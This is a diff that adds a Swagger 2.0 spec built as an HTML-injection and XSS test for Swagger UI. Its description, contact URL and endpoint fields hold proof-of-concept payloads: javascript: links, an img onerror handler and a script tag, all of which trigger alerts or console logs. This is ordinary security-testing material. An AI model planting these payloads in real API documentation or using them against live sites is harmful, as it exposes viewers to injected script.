@@ -1,0 +1,22 @@
+swagger: '2.0'
+info:
+  title: "Swagger UI HTML Injection Test"
+  description: |
+    <h1>HTML Injection Successful</h1>
+    <p>If you see large text above, HTML injection is working.</p>
+    <marquee>Testing Marquee Tag</marquee>
+    <br>
+    <a href="javascript:alert('XSS Execution Successful')">Click here to test XSS</a>
+    <img src=x onerror="alert('Stored/DOM XSS Successful!')">
+  version: "1.0.0"
+  contact:
+    name: "Security Tester"
+    url: "javascript:alert('XSS in Contact URL')"
+paths:
+  /test-endpoint:
+    get:
+      summary: "Test endpoint for injection"
+      description: "<h2>Injection in endpoint description!</h2><script>console.log('XSS')</script>"
+      responses:
+        '200':
+          description: "OK"
